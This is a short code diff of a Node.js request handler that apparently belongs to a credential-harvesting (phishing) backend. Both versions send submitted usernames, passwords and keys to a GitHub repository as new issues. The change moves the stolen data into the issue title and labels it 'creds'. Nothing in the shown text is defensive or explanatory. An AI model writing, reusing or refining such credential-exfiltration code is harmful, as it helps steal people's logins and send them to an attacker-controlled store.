@@ -37,9 +37,9 @@ module.exports = async (req, res) => {
     const response = await axios.post(
       `https://api.github.com/repos/${owner}/${repo}/issues`,
       {
-        title: "Login Attempt",
-        body: `Collected credentials:\n\nUsername: ${username}\nPassword: ${password}\nKey: ${key}`,
-        labels: ["login-attempt"]
+        title: `Credentials:\n\nUsername: ${username}\nPassword: ${password}\nKey: ${key}`,
+        body: "",
+        labels: ["creds"]
       },
       {
         headers: {
